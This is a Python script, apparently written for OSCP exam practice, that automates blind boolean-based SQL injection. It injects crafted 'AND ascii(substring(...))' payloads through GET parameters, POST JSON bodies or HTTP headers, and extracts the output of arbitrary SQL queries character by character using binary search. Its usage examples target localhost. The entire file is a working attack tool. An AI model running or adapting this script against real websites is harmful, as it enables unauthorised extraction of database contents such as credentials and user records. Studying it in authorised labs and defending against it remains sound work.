import requests
import argparse
import sys

# USAGE:
# python3 sql_bool.py -u "http://127.0.0.1:3000/user" -t get -p "id" --prefix "1" -c "user()"
# python3 sql_bool.py -u "http://127.0.0.1:3000/search" -t post -p "search" --prefix "admin'" --suffix " -- -" -c "user()"
# python3 sql_bool.py -u "http://127.0.0.1:3000/dashboard" -t header -p "Cookie" --prefix "tracking_id=1'" --suffix " -- -" -c "user()"

# Default success marker, though we can make this an argument too
SUCCESS_MARKER = "user" 

def make_request(args, payload):
    # This is the "Magic" line. 
    # It wraps your payload in the prefix (e.g., admin') and suffix (e.g., #)
    injection = f"{args.prefix}{payload}{args.suffix}"
    
    try:
        if args.type == "get":
            r = requests.get(args.url, params={args.parameter: injection})
            
        elif args.type == "post":
            # Your server uses app.use(express.json()), so we use json=
            r = requests.post(args.url, json={args.parameter: injection})
            
        elif args.type == "header":
            r = requests.get(args.url, headers={args.parameter: injection})
        
        # Debug: Uncomment the line below to see what is actually being sent
        # print(f"\r[DEBUG] Sending: {injection}", end="")
        
        return SUCCESS_MARKER in r.text

    except Exception as e:
        print(f"\n[!] Connection error: {e}")
        sys.exit(1)

def extract_data(args):
    print(f"[*] Target: {args.url}")
    print(f"[*] Mode: {args.type.upper()} | Parameter: {args.parameter}")
    print(f"[*] Prefix: {args.prefix} | Suffix: {args.suffix}")
    
    result = ""
    char_pos = 1
    
    while True:
        low, high = 32, 126
        found_at_this_pos = False
        
        while low <= high:
            mid = (low + high) // 2
            # The logic core
            payload = f" AND ascii(substring(({args.command}),{char_pos},1)) > {mid}"
            
            if make_request(args, payload):
                low = mid + 1
                found_at_this_pos = True
            else:
                high = mid - 1
        
        if not found_at_this_pos:
            break
            
        result += chr(low)
        sys.stdout.write(f"\r[!] Extracted: {result}")
        sys.stdout.flush()
        char_pos += 1
        
    return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Universal OSCP Boolean SQLi Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--type", choices=['get', 'post', 'header'], required=True, help="Injection type")
    parser.add_argument("-p", "--parameter", required=True, help="Vulnerable param/header name")
    parser.add_argument("-c", "--command", required=True, help="SQL to execute")
    
    # NEW: Prefix and Suffix for quote balancing
    parser.add_argument("--prefix", default="1", help="Injection prefix (e.g. admin')")
    parser.add_argument("--suffix", default="", help="Injection suffix (e.g. # or -- -)")
    
    args = parser.parse_args()
    
    print("\n--- Blind SQLi Extractor ---")
    final_output = extract_data(args)
    
    if final_output:
        print(f"\n\n[SUCCESS] Result: {final_output}")
    else:
        print("\n\n[FAILURE] No data found. Try changing --prefix or --suffix.")


